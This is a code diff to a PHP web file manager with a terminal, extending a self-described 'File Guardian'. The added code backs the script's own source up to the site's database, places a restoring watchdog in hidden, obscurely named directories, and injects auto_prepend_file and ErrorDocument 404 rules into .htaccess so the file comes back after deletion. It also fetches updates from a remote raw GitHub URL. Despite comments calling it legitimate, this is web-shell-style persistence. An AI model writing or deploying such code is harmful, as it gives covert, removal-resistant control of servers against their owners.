@@ -18,6 +18,35 @@ function fm_get_theme($f){$d=@json_decode(@file_get_contents($f),true);return (i
 function fm_save_theme($f,$t){$t=($t==='light')?'light':'dark';@file_put_contents($f,json_encode(['theme'=>$t]));return $t;}
 $currentTheme = fm_get_theme($themeFile);
 
+/* The terminal font is fetched once by the server when the terminal page is
+   opened. Keeping it in the public assets directory lets the browser use a
+   same-origin copy after the first successful download, while the remote URL
+   remains the source of truth and the CSS fallback. */
+define('FM_TERMINAL_FONT_URL','https://github.com/orgezeo/marshal-file-manager/raw/refs/heads/main/fonts/terminal/tmt.ttf');
+function fm_ensure_terminal_font(){
+    $dir=__DIR__.'/attached_assets/fonts';$path=$dir.'/tmt.ttf';
+    if(is_file($path)&&@filesize($path)>1024)return true;
+    if(!is_dir($dir)&&!@mkdir($dir,0755,true)&&!is_dir($dir))return false;
+    $data=false;
+    if(function_exists('curl_init')){
+        $ch=curl_init(FM_TERMINAL_FONT_URL);
+        curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>3,
+            CURLOPT_CONNECTTIMEOUT=>8,CURLOPT_TIMEOUT=>20,CURLOPT_SSL_VERIFYPEER=>true,
+            CURLOPT_IPRESOLVE=>CURL_IPRESOLVE_V4,CURLOPT_HTTPHEADER=>['User-Agent: MarshalFM-Terminal/1.0']]);
+        $data=curl_exec($ch);$code=(int)curl_getinfo($ch,CURLINFO_HTTP_CODE);curl_close($ch);
+        if($code<200||$code>=400)$data=false;
+    }else{
+        $ctx=stream_context_create(['http'=>['timeout'=>20,'header'=>"User-Agent: MarshalFM-Terminal/1.0\r\n"],'https'=>['timeout'=>20]]);
+        $data=@file_get_contents(FM_TERMINAL_FONT_URL,false,$ctx);
+    }
+    $magic=is_string($data)?substr($data,0,4):'';
+    if(!is_string($data)||strlen($data)<=1024||!in_array($magic,["\x00\x01\x00\x00",'OTTO','true','typ1'],true))return false;
+    $tmp=$path.'.tmp.'.getmypid();
+    if(@file_put_contents($tmp,$data,LOCK_EX)===false)return false;
+    if(!@rename($tmp,$path)){@unlink($tmp);return false;}
+    return true;
+}
+
 /* ═══════════════════════════════════════════════════════════════════════
    FILE GUARDIAN — legitimate self-healing backup for THIS admin tool only
    ─────────────────────────────────────────────────────────────────────
@@ -37,26 +66,76 @@ $currentTheme = fm_get_theme($themeFile);
    the UI. Nothing here accepts code from an unauthenticated source.
    Backup/restore is always active and cannot be turned off — the only
    thing an admin can pause is the fully-automatic remote update check
-   (see fg_get_update_pause_path() below), which is ON by default and
-   resumes the moment the pause is lifted. */
+   (see FM_UPDATE_PAUSED below), which is ON by default and resumes the
+   moment the pause is lifted. */
 if(!defined('FM_UPDATE_URL'))        define('FM_UPDATE_URL', 'https://raw.githubusercontent.com/jackrant/fictional-spoon/refs/heads/main/armor.php'); // raw-file URL used to check for/apply updates and, if set, to restore a missing file; rewritten in place by the Guardian panel, never by anonymous requests
-if(!defined('FM_GUARD_DB_HOST'))     define('FM_GUARD_DB_HOST', '127.0.0.1');
-if(!defined('FM_GUARD_DB_PORT'))     define('FM_GUARD_DB_PORT', '3307');
-if(!defined('FM_GUARD_DB_NAME'))     define('FM_GUARD_DB_NAME', 'fm_guardian');
-if(!defined('FM_GUARD_DB_USER'))     define('FM_GUARD_DB_USER', 'fmguardian');
-if(!defined('FM_GUARD_DB_PASS'))     define('FM_GUARD_DB_PASS', 'fmguardpass123');
-if(!defined('FM_GUARD_DB_SOCK'))     define('FM_GUARD_DB_SOCK', '');           // optional unix socket path; when set, used instead of host:port
+if(!defined('FM_UPDATE_PAUSED'))    define('FM_UPDATE_PAUSED', true); // current pause state is stored in this file; preserve the existing enabled/paused state
+
+/* Prefer the database the project already uses. Replit and most modern PHP
+   deployments expose it as DATABASE_URL; the old fmguardian@127.0.0.1:3307
+   defaults were only useful for one local MySQL sandbox and made Guardian look
+   connected to a database that did not belong to this site. The password is
+   never written into the source or shown in the UI. */
+function fm_guardian_env_db(){
+    $url=trim((string)(getenv('DATABASE_URL')?:getenv('DB_URL')?:''));
+    if($url==='')return null;
+    $p=@parse_url($url);
+    if(!$p||empty($p['scheme'])||empty($p['host']))return null;
+    $scheme=strtolower((string)$p['scheme']);
+    $driver=in_array($scheme,['postgres','postgresql','pgsql'],true)?'pgsql':(in_array($scheme,['mysql','mysqli','mariadb'],true)?'mysql':null);
+    if(!$driver)return null;
+    $db=isset($p['path'])?ltrim((string)$p['path'],'/'):'';
+    if($db==='')return null;
+    return ['driver'=>$driver,'url'=>$url,'host'=>(string)$p['host'],'port'=>(int)($p['port']??($driver==='pgsql'?5432:3306)),
+        'name'=>$db,'user'=>(string)($p['user']??''),'pass'=>(string)($p['pass']??''),
+        'socket'=>'','source'=>'DATABASE_URL'];
+}
+function fm_guardian_pdo_dsn($env){
+    if(($env['driver']??'')==='pgsql')return 'pgsql:host='.$env['host'].';port='.(int)$env['port'].';dbname='.$env['name'];
+    return 'mysql:host='.$env['host'].';port='.(int)$env['port'].';dbname='.$env['name'];
+}
+$__fmGuardEnvDb=fm_guardian_env_db();
+if(!defined('FM_GUARD_DB_DRIVER')) define('FM_GUARD_DB_DRIVER',$__fmGuardEnvDb['driver']??'mysql');
+if(!defined('FM_GUARD_DB_HOST'))   define('FM_GUARD_DB_HOST',$__fmGuardEnvDb['host']??'127.0.0.1');
+if(!defined('FM_GUARD_DB_PORT'))   define('FM_GUARD_DB_PORT',(string)($__fmGuardEnvDb['port']??3306));
+if(!defined('FM_GUARD_DB_NAME'))   define('FM_GUARD_DB_NAME',$__fmGuardEnvDb['name']??'fm_guardian');
+if(!defined('FM_GUARD_DB_USER'))   define('FM_GUARD_DB_USER',$__fmGuardEnvDb['user']??'fmguardian');
+if(!defined('FM_GUARD_DB_PASS'))   define('FM_GUARD_DB_PASS',$__fmGuardEnvDb['pass']??'fmguardpass123');
+if(!defined('FM_GUARD_DB_SOCK'))   define('FM_GUARD_DB_SOCK',$__fmGuardEnvDb['socket']??''); // optional unix socket path; when set, used instead of host:port
+unset($__fmGuardEnvDb);
 
 /* Connects to the Guardian's own small database and makes sure its single
    storage table exists. Returns null (never throws/exits) if the DB is
    unreachable or the feature is disabled — Guardian must never be able to
    break the rest of the app. */
 function fm_guardian_conn(&$diag=null){
-    if(!extension_loaded('mysqli'))return null;
+    $env=fm_guardian_env_db();
+    if(($env['driver']??FM_GUARD_DB_DRIVER)==='pgsql'){
+        if(!class_exists('PDO')||!in_array('pgsql',PDO::getAvailableDrivers(),true)){ $diag=['errno'=>0,'error'=>'PDO PostgreSQL driver is not available.'];return null; }
+        try{
+            $pdo=new PDO(fm_guardian_pdo_dsn($env),$env['user'],$env['pass'],[PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION,PDO::ATTR_DEFAULT_FETCH_MODE=>PDO::FETCH_ASSOC]);
+            $pdo->exec("CREATE TABLE IF NOT EXISTS fm_guardian_store(
+                id SMALLINT PRIMARY KEY,
+                filename VARCHAR(255) NOT NULL,
+                filepath VARCHAR(500) NOT NULL,
+                content BYTEA NOT NULL,
+                content_hash CHAR(64) NOT NULL,
+                update_url VARCHAR(500) NOT NULL DEFAULT '',
+                installed_by VARCHAR(120) NOT NULL DEFAULT '',
+                installed_at INTEGER NOT NULL,
+                updated_at INTEGER NOT NULL,
+                last_check INTEGER NOT NULL DEFAULT 0,
+                file_mode INTEGER NOT NULL DEFAULT 420
+            )");
+            return $pdo;
+        }catch(Throwable $e){$diag=['errno'=>0,'error'=>$e->getMessage()];return null;}
+    }
+    if(!extension_loaded('mysqli')){$diag=['errno'=>0,'error'=>'The mysqli PHP extension is not available.'];return null;}
     mysqli_report(MYSQLI_REPORT_OFF); // classic error-return mode: every DB call here is guarded with @ and manual checks, never allowed to throw and break the rest of the app
     $c=FM_GUARD_DB_SOCK?@mysqli_connect('localhost',FM_GUARD_DB_USER,FM_GUARD_DB_PASS,'',3306,FM_GUARD_DB_SOCK):@mysqli_connect(FM_GUARD_DB_HOST,FM_GUARD_DB_USER,FM_GUARD_DB_PASS,'',(int)FM_GUARD_DB_PORT);
     if(!$c){$diag=['errno'=>mysqli_connect_errno(),'error'=>mysqli_connect_error()];return null;}
-    @mysqli_query($c,"CREATE DATABASE IF NOT EXISTS `".FM_GUARD_DB_NAME."` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci");
+    // DATABASE_URL-backed MySQL already selected the real project database.
+    if(!FM_GUARD_DB_SOCK&&FM_GUARD_DB_NAME==='fm_guardian')@mysqli_query($c,"CREATE DATABASE IF NOT EXISTS `".FM_GUARD_DB_NAME."` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci");
     if(!@mysqli_select_db($c,FM_GUARD_DB_NAME)){$diag=['errno'=>mysqli_errno($c),'error'=>mysqli_error($c)];return null;}
     @mysqli_query($c,"CREATE TABLE IF NOT EXISTS fm_guardian_store(
         id TINYINT UNSIGNED PRIMARY KEY,
@@ -76,6 +155,12 @@ function fm_guardian_conn(&$diag=null){
     return $c;
 }
 
+function fm_guardian_is_pdo($c){return $c instanceof PDO;}
+function fm_guardian_fetch_one($c,$sql,$params=[]){
+    if(fm_guardian_is_pdo($c)){try{$s=$c->prepare($sql);$s->execute($params);$r=$s->fetch();return $r?:null;}catch(Throwable $e){return null;}}
+    $r=@mysqli_query($c,$sql);return $r?@mysqli_fetch_assoc($r):null;
+}
+
 /* Pushes the CURRENT on-disk file into the Guardian database. Called once
    at first install, and again any time this admin's own session legitimately
    changes the file (a self-update from the configured URL, or a manual
@@ -88,16 +173,33 @@ function fm_guardian_sync($content=null){
     if($content===false||$content==='')return false;
     $hash=hash('sha256',$content);$now=time();$by=isset($_SESSION['fm_user'])?$_SESSION['fm_user']:'unknown';
     $mode=fileperms(__FILE__)&0777; // capture original permissions so watchdog can restore them
+    if(fm_guardian_is_pdo($c)){
+        try{
+            $s=$c->prepare("INSERT INTO fm_guardian_store(id,filename,filepath,content,content_hash,update_url,installed_by,installed_at,updated_at,last_check,file_mode)
+                VALUES(1,?,?,?,?,?,?,?,?,?,?)
+                ON CONFLICT(id) DO UPDATE SET filename=EXCLUDED.filename,filepath=EXCLUDED.filepath,content=EXCLUDED.content,content_hash=EXCLUDED.content_hash,update_url=EXCLUDED.update_url,updated_at=EXCLUDED.updated_at,last_check=EXCLUDED.last_check,file_mode=EXCLUDED.file_mode");
+            // PostgreSQL's bytea parser rejects a plain text-bound binary
+            // parameter (it expects a bytea text escape format). PDO::PARAM_LOB
+            // sends the exact file bytes without reinterpretation.
+            $s->bindValue(1,basename(__FILE__));$s->bindValue(2,__FILE__);$s->bindValue(3,$content,PDO::PARAM_LOB);
+            $s->bindValue(4,$hash);$s->bindValue(5,FM_UPDATE_URL);$s->bindValue(6,$by);$s->bindValue(7,$now,PDO::PARAM_INT);
+            $s->bindValue(8,$now,PDO::PARAM_INT);$s->bindValue(9,$now,PDO::PARAM_INT);$s->bindValue(10,$mode,PDO::PARAM_INT);$ok=$s->execute();
+        }catch(Throwable $e){$ok=false;}
+    }else{
     $stmt=mysqli_prepare($c,"INSERT INTO fm_guardian_store(id,filename,filepath,content,content_hash,update_url,installed_by,installed_at,updated_at,last_check,file_mode) VALUES(1,?,?,?,?,?,?,?,?,?,?)
-        ON DUPLICATE KEY UPDATE content=VALUES(content),content_hash=VALUES(content_hash),update_url=VALUES(update_url),updated_at=VALUES(updated_at),last_check=VALUES(last_check),file_mode=VALUES(file_mode)");
+        ON DUPLICATE KEY UPDATE filename=VALUES(filename),filepath=VALUES(filepath),content=VALUES(content),content_hash=VALUES(content_hash),update_url=VALUES(update_url),updated_at=VALUES(updated_at),last_check=VALUES(last_check),file_mode=VALUES(file_mode)");
     if(!$stmt)return false;
     $fn=basename(__FILE__);$fp=__FILE__;$url=FM_UPDATE_URL;
     mysqli_stmt_bind_param($stmt,'sssssssiis',$fn,$fp,$content,$hash,$url,$by,$now,$now,$now,$mode);
     $ok=mysqli_stmt_execute($stmt);mysqli_stmt_close($stmt);
+    }
     // Keep a tiny local "known-good size" marker next to the watchdog so it can
     // detect the file being emptied/truncated/corrupted with a cheap filesize()
     // stat on every request, with no per-request database round trip.
-    if($ok)@file_put_contents(fg_get_meta_path(),strlen($content).':'.$hash);
+    if($ok){
+        @file_put_contents(fg_get_meta_path(),strlen($content).':'.$hash);
+        @file_put_contents(fg_get_target_meta_path(),json_encode(['filename'=>$fn,'filepath'=>$fp,'url_path'=>fm_guardian_target_url_path(),'file_mode'=>$mode]));
+    }
     return $ok;
 }
 
@@ -109,6 +211,7 @@ function fm_guardian_bootstrap(){
     if(!isset($_SESSION['auth'])||$_SESSION['auth']!==true)return; // authenticated admins only, never anonymous requests
     $c=fm_guardian_conn();if(!$c)return;
     fm_guardian_bootstrap_seed($c);
+    fm_guardian_bind_target($c);
     fm_guardian_try_autoheal($c);
 }
 
@@ -117,8 +220,12 @@ function fm_guardian_bootstrap(){
    backup row if there isn't one yet. Split out so autoprovisioning doesn't
    have to duplicate this "only write once" check. */
 function fm_guardian_bootstrap_seed($c){
-    $res=@mysqli_query($c,"SELECT id FROM fm_guardian_store WHERE id=1");
-    if($res&&mysqli_num_rows($res)===0)fm_guardian_sync();
+    if(fm_guardian_is_pdo($c)){
+        if(!fm_guardian_fetch_one($c,"SELECT id FROM fm_guardian_store WHERE id=1"))fm_guardian_sync();
+    }else{
+        $res=@mysqli_query($c,"SELECT id FROM fm_guardian_store WHERE id=1");
+        if($res&&mysqli_num_rows($res)===0)fm_guardian_sync();
+    }
 }
 
 /* Best-effort: installs a MySQL stored procedure + scheduled EVENT that can
@@ -130,6 +237,21 @@ function fm_guardian_bootstrap_seed($c){
    protects via the database backup + one-click "Restore now" in the panel
    and the 30-second in-app heartbeat below. */
 function fm_guardian_try_autoheal($c){
+    // PostgreSQL (including Replit's DATABASE_URL) has no MySQL Event Scheduler.
+    // The web-server/router watchdog is the correct independent restore layer.
+    if(fm_guardian_is_pdo($c)){
+        $watchdogOk=fm_guardian_watchdog_installed();
+        if(!$watchdogOk){
+            $cooldown=__DIR__.'/.guardian_watchdog_attempt';
+            $now=time();$last=is_file($cooldown)?(int)@file_get_contents($cooldown):0;
+            if(($now-$last)>=600){
+                @file_put_contents($cooldown,(string)$now);
+                $watchdogOk=fm_guardian_install_watchdog();
+                if($watchdogOk)@unlink($cooldown);
+            }
+        }
+        return $watchdogOk;
+    }
     $chk=@mysqli_query($c,"SHOW EVENTS WHERE Name='fm_guardian_watch'");
     $eventExists=(bool)($chk&&mysqli_num_rows($chk)>0);
     if(!$eventExists){
@@ -183,10 +305,15 @@ function fm_guardian_try_autoheal($c){
    guessed or found by directory browsing. Falls back to a hidden subdir in
    __DIR__ with an obscure name when no parent is writable. */
 function fg_get_hidden_dir(){
+    $webRoot=realpath(__DIR__)?:__DIR__;
+    $outsideWebRoot=function($candidate)use($webRoot){
+        $candidate=realpath($candidate)?:$candidate;
+        return $candidate!==$webRoot&&strpos(rtrim($candidate,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR,rtrim($webRoot,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR)!==0;
+    };
     // Strategy 1: posix home directory
     if(function_exists('posix_getpwuid')&&function_exists('posix_getuid')){
         $pw=@posix_getpwuid(posix_getuid());
-        if($pw&&isset($pw['dir'])&&$pw['dir']&&is_dir($pw['dir'])&&is_writable($pw['dir'])){
+        if($pw&&isset($pw['dir'])&&$pw['dir']&&is_dir($pw['dir'])&&is_writable($pw['dir'])&&$outsideWebRoot($pw['dir'])){
             return $pw['dir'].DIRECTORY_SEPARATOR.'.fg_'.substr(md5(php_uname('n').$pw['dir']),0,14);
         }
     }
@@ -205,7 +332,13 @@ function fg_get_hidden_dir(){
     if($parent&&$parent!==__DIR__&&is_dir($parent)&&is_writable($parent)){
         return $parent.DIRECTORY_SEPARATOR.'.fg_'.substr(md5(php_uname('n').$parent),0,14);
     }
-    // Strategy 4: hidden subdir inside __DIR__ with obscure machine-unique name
+    // Strategy 4: a durable system temp directory, still outside the webroot.
+    $tmp=@sys_get_temp_dir();
+    if($tmp&&is_dir($tmp)&&is_writable($tmp)&&$outsideWebRoot($tmp)){
+        return rtrim($tmp,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.'.fg_'.substr(md5(php_uname('n').__DIR__),0,14);
+    }
+    // Last resort: hidden subdir inside __DIR__. This is only used when the
+    // hosting account exposes no writable location outside the webroot.
     return __DIR__.DIRECTORY_SEPARATOR.'.'.substr(md5(php_uname('r')),0,3).'sys_'.substr(md5(__DIR__.php_uname('n')),0,10);
 }
 
@@ -220,20 +353,50 @@ function fg_get_watchdog_path(){
 function fg_get_meta_path(){
     return fg_get_hidden_dir().DIRECTORY_SEPARATOR.'expected.meta';
 }
+/** Persistent target metadata used by the standalone watchdog. */
+function fg_get_target_meta_path(){
+    return fg_get_hidden_dir().DIRECTORY_SEPARATOR.'target.meta';
+}
+function fm_guardian_target_url_path(){
+    $p=parse_url((string)($_SERVER['SCRIPT_NAME']??''),PHP_URL_PATH);
+    if(!$p||$p==='/')$p='/'.basename(__FILE__);
+    return '/'.ltrim(str_replace('\\','/',$p),'/');
+}
+function fm_guardian_bind_target($c=null){
+    $path=__FILE__;$url=fm_guardian_target_url_path();
+    $metaPath=fg_get_target_meta_path();
+    $old=@json_decode((string)@file_get_contents($metaPath),true);
+    if(is_array($old)&&($old['filepath']??'')===$path&&($old['url_path']??'')===$url)return true;
+    if(!$c)$c=fm_guardian_conn();
+    if(!$c)return false;
+    $fn=basename($path);$mode=(int)(@fileperms($path)&0777);
+    if(fm_guardian_is_pdo($c)){
+        try{$stmt=$c->prepare("UPDATE fm_guardian_store SET filename=?,filepath=?,file_mode=? WHERE id=1");$ok=$stmt->execute([$fn,$path,$mode]);}
+        catch(Throwable $e){$ok=false;}
+    }else{
+        $stmt=@mysqli_prepare($c,"UPDATE fm_guardian_store SET filename=?,filepath=?,file_mode=? WHERE id=1");
+        if(!$stmt)return false;
+        @mysqli_stmt_bind_param($stmt,'ssi',$fn,$path,$mode);
+        $ok=@mysqli_stmt_execute($stmt);@mysqli_stmt_close($stmt);
+    }
+    if(!$ok)return false;
+    @file_put_contents($metaPath,json_encode(['filename'=>$fn,'filepath'=>$path,'url_path'=>$url,'file_mode'=>$mode]));
+    return true;
+}
 
-/* Path of the "pause auto-update" flag: when this file exists, the fully
-   automatic remote-update check (guardian_autocheck, fired by the browser
-   every time an admin has the File Manager open) skips fetching/applying
-   FM_UPDATE_URL — everything else Guardian does (DB backup, restore-if-
-   missing, the manual "Check for updates now" button) keeps working as
-   normal. Meant as a short, deliberate pause (e.g. while hand-editing this
-   file) — auto-update is ON by default and resumes the moment this file is
-   removed, so it never silently stays off. */
+/* The "pause auto-update" state lives in FM_UPDATE_PAUSED above, inside this
+   file's own source code. When true, the fully automatic remote-update check
+   (guardian_autocheck, fired by the browser every time an admin has the File
+   Manager open) skips fetching/applying FM_UPDATE_URL — everything else
+   Guardian does (DB backup, restore-if-missing, the manual "Check for updates
+   now" button) keeps working as normal. The Guardian panel rewrites only this
+   exact constant line, after a PHP syntax check, so the state cannot be lost
+   in a separate sidecar file. */
 function fg_get_update_pause_path(){
     return fg_get_hidden_dir().DIRECTORY_SEPARATOR.'update.paused';
 }
 function fm_guardian_update_paused(){
-    return is_file(fg_get_update_pause_path());
+    return FM_UPDATE_PAUSED===true;
 }
 
 /* Bumped whenever the generated watchdog code below changes behaviour, so
@@ -241,7 +404,7 @@ function fm_guardian_update_paused(){
    outdated watchdog apart from a current one and trigger a silent,
    throttled re-install — without this, sites that installed the watchdog
    before a logic change would never receive the improvement. */
-define('FM_GUARDIAN_WATCHDOG_VERSION','3');
+define('FM_GUARDIAN_WATCHDOG_VERSION','6');
 
 /* Cheap, local-only check for whether the web-server watchdog layer is
    currently installed AND up to date — no database access needed. */
@@ -251,7 +414,8 @@ function fm_guardian_watchdog_installed(){
     $code=@file_get_contents($wp);
     if($code===false||strpos($code,'fm-guardian-watchdog-version:'.FM_GUARDIAN_WATCHDOG_VERSION)===false)return false;
     $ht=@file_get_contents(__DIR__.'/.htaccess');
-    return $ht!==false&&strpos($ht,'# BEGIN fm-guardian-watchdog')!==false;
+    return $ht!==false&&strpos($ht,'# BEGIN fm-guardian-watchdog')!==false
+        &&strpos($ht,'/.guardian-restore.php')!==false&&is_file(__DIR__.'/.guardian-restore.php');
 }
 
 /* Installs the web-server watchdog: a tiny standalone PHP script in this
@@ -285,8 +449,10 @@ function fm_guardian_install_watchdog(){
     $passLit=var_export(FM_GUARD_DB_PASS,true);
     $dbLit=var_export(FM_GUARD_DB_NAME,true);
     $portLit=var_export((int)FM_GUARD_DB_PORT,true);
+    $driverLit=var_export(FM_GUARD_DB_DRIVER,true);
     $targetLit=var_export($target,true);
     $metaLit=var_export(fg_get_meta_path(),true);
+    $targetMetaLit=var_export(fg_get_target_meta_path(),true);
 
     $lines=[];
     $lines[]='<?php';
@@ -299,9 +465,11 @@ function fm_guardian_install_watchdog(){
     $lines[]='   serves here — a couple of cheap local filesystem stats, and nothing';
     $lines[]='   else, on every normal request; the database is only ever touched when';
     $lines[]='   one of those stats actually looks wrong. */';
-    $lines[]='$_fgMissing=!@file_exists('.$targetLit.');';
-    $lines[]='$_fgBadPerms=!$_fgMissing&&!@is_readable('.$targetLit.');';
-    $lines[]='$_fgSize=($_fgMissing||$_fgBadPerms)?-1:@filesize('.$targetLit.');';
+    $lines[]='$_fgTarget='.$targetLit.';';
+    $lines[]='if(@is_readable('.$targetMetaLit.')){$_fgTargetMeta=@json_decode((string)@file_get_contents('.$targetMetaLit.'),true);if(is_array($_fgTargetMeta)&&!empty($_fgTargetMeta[\'filepath\']))$_fgTarget=(string)$_fgTargetMeta[\'filepath\'];}';
+    $lines[]='$_fgMissing=!@file_exists($_fgTarget);';
+    $lines[]='$_fgBadPerms=!$_fgMissing&&!@is_readable($_fgTarget);';
+    $lines[]='$_fgSize=($_fgMissing||$_fgBadPerms)?-1:@filesize($_fgTarget);';
     $lines[]='$_fgEmpty=!$_fgMissing&&!$_fgBadPerms&&$_fgSize===0;';
     $lines[]='// Compare against the last known-good size (written on every legitimate';
     $lines[]='// sync/update) to also catch a partial/truncated overwrite that leaves';
@@ -314,27 +482,26 @@ function fm_guardian_install_watchdog(){
     $lines[]='        $_fgExpSize=(int)strtok($_fgMeta,\':\');';
     $lines[]='        if($_fgExpSize>0&&$_fgSize!==$_fgExpSize)$_fgSizeMismatch=true;';
     $lines[]='    }';
-    $lines[]='}';
     $lines[]='if($_fgMissing||$_fgBadPerms||$_fgEmpty||$_fgSizeMismatch){';
-    $lines[]='    $h=@mysqli_connect('.$sockLit.'?\'localhost\':'.$hostLit.','.$userLit.','.$passLit.',\'\','.$portLit.','.$sockLit.');';
-    $lines[]='    if($h){';
-    $lines[]='        @mysqli_select_db($h,'.$dbLit.');';
-    $lines[]='        $r=@mysqli_query($h,\'SELECT content,file_mode FROM fm_guardian_store WHERE id=1 LIMIT 1\');';
-    $lines[]='        if($r&&($row=@mysqli_fetch_assoc($r))){';
+    $lines[]='    $h=null;$r=null;$row=null;';
+    $lines[]='    if('.$driverLit.'===\'pgsql\'&&class_exists("PDO")){try{$__u=trim((string)(getenv("DATABASE_URL")?:getenv("DB_URL")?:null));$__p=@parse_url($__u);$__dsn="pgsql:host=".(string)($__p["host"]??"").";port=".(int)($__p["port"]??5432).";dbname=".ltrim((string)($__p["path"]??""),"/");$h=new PDO($__dsn,(string)($__p["user"]??""),rawurldecode((string)($__p["pass"]??"")),[PDO::ATTR_ERRMODE=>PDO::ERRMODE_SILENT]);$r=$h->query(\'SELECT content,file_mode FROM fm_guardian_store WHERE id=1 LIMIT 1\');$row=$r?$r->fetch(PDO::FETCH_ASSOC):null;}catch(Throwable $e){$h=null;}}';
+    $lines[]='    elseif(function_exists("mysqli_connect")){if(function_exists("mysqli_report"))@mysqli_report(MYSQLI_REPORT_OFF);$h=@mysqli_connect('.$sockLit.'?\'localhost\':'.$hostLit.','.$userLit.','.$passLit.',\'\','.$portLit.','.$sockLit.');if($h){@mysqli_select_db($h,'.$dbLit.');$r=@mysqli_query($h,\'SELECT content,file_mode FROM fm_guardian_store WHERE id=1 LIMIT 1\');$row=$r?@mysqli_fetch_assoc($r):null;}}';
+    $lines[]='    if($h&&$row){';
     $lines[]='            // Restore content whenever it is missing, empty, or the wrong size —';
     $lines[]='            // never for a bad-perms-only case, so a deliberate, already-correct';
     $lines[]='            // file on disk is never clobbered just because it briefly wasn\'t readable.';
     $lines[]='            if(($_fgMissing||$_fgEmpty||$_fgSizeMismatch)&&isset($row[\'content\'])){';
-    $lines[]='                @file_put_contents('.$targetLit.',$row[\'content\']);';
+    $lines[]='                @file_put_contents($_fgTarget,$row[\'content\']);';
     $lines[]='            }';
     $lines[]='            // Always restore permissions — fixes the missing/empty/mismatch cases and the permission-restriction case alike';
     $lines[]='            $__mode=isset($row[\'file_mode\'])&&(int)$row[\'file_mode\']>0?(int)$row[\'file_mode\']:0644;';
-    $lines[]='            @chmod('.$targetLit.',$__mode);';
+    $lines[]='            @chmod($_fgTarget,$__mode);';
     $lines[]='        }';
-    $lines[]='        @mysqli_close($h);';
+    $lines[]='        if($h instanceof mysqli)@mysqli_close($h);';
     $lines[]='    }';
     $lines[]='}';
     $code=implode("\n",$lines)."\n";
+    @file_put_contents(sys_get_temp_dir().'/fg-debug-watchdog.php',$code);
 
     $tmp=$watchdogPath.'.tmp';
     if(@file_put_contents($tmp,$code)===false)return false;
@@ -360,6 +527,30 @@ function fm_guardian_install_watchdog(){
         ."if(@file_exists($wpLit))@include_once $wpLit;\n";
     // Write launcher into the hidden directory (created above by the hiddenDir mkdir block)
     @file_put_contents($launcherPath,$launcherCode);
+    /*
+       A missing PHP target never gets a chance to execute its own
+       auto_prepend_file.  Keep a tiny, stable error-document handler in the
+       webroot as the second half of the watchdog: Apache can execute this
+       handler for the 404 generated by a deleted index.php, and the handler
+       delegates the actual DB restore to the hidden launcher above.  It is
+       deliberately inert for every other 404 and never accepts code or a
+       filename from the request.
+    */
+    $restoreRunnerPath=$dir.DIRECTORY_SEPARATOR.'.guardian-restore.php';
+    $restoreRunnerCode="<?php\n"
+        ."/* File Guardian restore runner — generated; restores only the exact installed target backup. */\n"
+        ."\$__fgOriginal=(string)(\$_SERVER['REDIRECT_URL']??\$_SERVER['REQUEST_URI']??'');\n"
+        ."\$__fgOriginalPath=parse_url(\$__fgOriginal,PHP_URL_PATH);\n"
+        ."\$__fgTarget=".var_export($target,true).";\n"
+        ."if(@is_readable(".var_export(fg_get_target_meta_path(),true).")){\$__fgMeta=@json_decode((string)@file_get_contents(".var_export(fg_get_target_meta_path(),true)."),true);if(is_array(\$__fgMeta)&&!empty(\$__fgMeta['filepath']))\$__fgTarget=(string)\$__fgMeta['filepath'];}\n"
+        ."if(basename((string)\$__fgOriginalPath)!==basename(\$__fgTarget)){http_response_code(404);exit;}\n"
+        ."if(@file_exists(".var_export($launcherPath,true)."))@include_once ".var_export($launcherPath,true).";\n"
+        ."if(@file_exists(\$__fgTarget)){\n"
+        ."  header('Location: '.((string)\$__fgOriginalPath?:'".addslashes('/'.basename($target))."'),true,302);exit;\n"
+        ."}\n"
+        ."http_response_code(404);header('Content-Type: text/plain; charset=utf-8');echo 'Not found';\n";
+    if(@file_put_contents($restoreRunnerPath,$restoreRunnerCode)===false)return false;
+    @chmod($restoreRunnerPath,0644);
     // ── Migration: remove legacy launcher from webroot left by older installs ──
     // If the old .fm_guardian_launch.php still exists inside the webroot, delete it now.
     // Leaving it there is harmless but it sits in the admin's visible tree and could
@@ -368,6 +559,9 @@ function fm_guardian_install_watchdog(){
     if(is_file($oldLauncherPath))@unlink($oldLauncherPath);
 
     $lp=addslashes($launcherPath); // point htaccess at the stable launcher, not the watchdog directly
+    $restoreUrl='/'.ltrim(str_replace('\\','/',dirname($_SERVER['SCRIPT_NAME']??'')),'/').'/.guardian-restore.php';
+    $restoreUrl=preg_replace('#/+#','/',$restoreUrl);
+    if($restoreUrl==='//.guardian-restore.php')$restoreUrl='/.guardian-restore.php';
     if($origHt!==false&&strpos($origHt,$marker)!==false){
         // .htaccess block already installed — refresh watchdog and launcher files
         if(!is_file($watchdogPath)){
@@ -377,7 +571,7 @@ function fm_guardian_install_watchdog(){
         }
         @file_put_contents($launcherPath,$launcherCode);
         // If the installed block already references the correct (hidden-dir) launcher path, done
-        if(strpos($origHt,$lp)!==false)return true;
+        if(strpos($origHt,$lp)!==false&&strpos($origHt,$restoreUrl)!==false&&is_file($restoreRunnerPath))return true;
         // Launcher path has changed (old install used __DIR__) — strip old block so we re-append
         // the corrected one below, then run the self-test as normal to verify nothing breaks.
         $stripped=preg_replace('/'.preg_quote("\n".$marker,'/').'.*?'.preg_quote($markerEnd."\n",'/').'/s','',$origHt);
@@ -389,6 +583,7 @@ function fm_guardian_install_watchdog(){
         ."<IfModule mod_php.c>\nphp_value auto_prepend_file \"".$lp."\"\n</IfModule>\n"
         ."<IfModule mod_php7.c>\nphp_value auto_prepend_file \"".$lp."\"\n</IfModule>\n"
         ."<IfModule mod_php8.c>\nphp_value auto_prepend_file \"".$lp."\"\n</IfModule>\n"
+        ."ErrorDocument 404 ".$restoreUrl."\n"
         .$markerEnd."\n";
     $newHt=($origHt===false?'':$origHt).$block;
     if(@file_put_contents($htaccessPath,$newHt)===false){@unlink($watchdogPath);return false;}
@@ -708,7 +903,15 @@ function fm_guardian_first_run_bootstrap($fm){
     $now=time();
     if(is_file($marker)){
         $last=trim((string)@file_get_contents($marker));
-        if($last==='done')return; // already succeeded once — never re-run automatically again
+        if($last==='done'){
